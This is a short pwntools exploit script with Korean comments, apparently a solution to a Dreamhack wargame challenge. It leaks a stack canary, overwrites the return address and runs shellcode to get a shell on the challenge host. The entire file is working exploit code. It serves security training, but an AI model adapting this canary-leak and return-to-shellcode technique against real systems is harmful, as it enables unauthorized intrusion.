from pwn import *

# 접속 정보 설정 (실제 포트는 문제 환경에 맞춰 변경하세요)
p = remote("host8.dreamhack.games", 11652)
# p = process("./r2s") # 로컬 테스트 시

context.arch = "amd64"

# [1] Buf 주소 획득
p.recvuntil(b"Address of the buf: ")
buf_addr = int(p.recvline()[:-1], 16)
log.info(f"Buf Address: {hex(buf_addr)}")

# Canary 위치 계산 (문제에서 주어진 buf와 rbp 거리 활용)
p.recvuntil(b"Distance between buf and $rbp: ")
buf_rbp_dist = int(p.recvline()[:-1])
canary_offset = buf_rbp_dist - 8
log.info(f"Canary Offset: {canary_offset}")

# [2] Canary Leaking
# Canary의 첫 바이트(\x00)를 덮어씌워 printf가 Canary를 출력하게 유도
payload_leak = b"A" * (canary_offset + 1)
p.sendafter(b"Input: ", payload_leak)

p.recvuntil(b"Your input is '")
p.recv(canary_offset + 1) # 우리가 보낸 'A'들 수신
canary = b"\x00" + p.recv(7) # 뒤따라오는 Canary 7바이트 수신 및 복구
log.success(f"Leaked Canary: {canary.hex()}")

# [3] Exploit (RET Overwrite)
# gets()는 개행(\n)을 만나면 입력을 종료하므로 쉘코드에 \n이 없어야 함
# pwntools의 shellcraft는 일반적으로 안전함
shellcode = asm(shellcraft.sh())

# Payload 구성
payload = shellcode
payload += b"A" * (canary_offset - len(shellcode)) # Shellcode 이후 Canary 전까지 Padding
payload += canary                                  # 복구한 Canary (변조 방지)
payload += b"B" * 8                                # SFP (Saved Frame Pointer) 덮기 (값 무관)
payload += p64(buf_addr)                           # RET를 buf 주소로 덮어 쉘코드 실행

# 두 번째 입력 (gets)
p.sendlineafter(b"Input: ", payload)

p.interactive()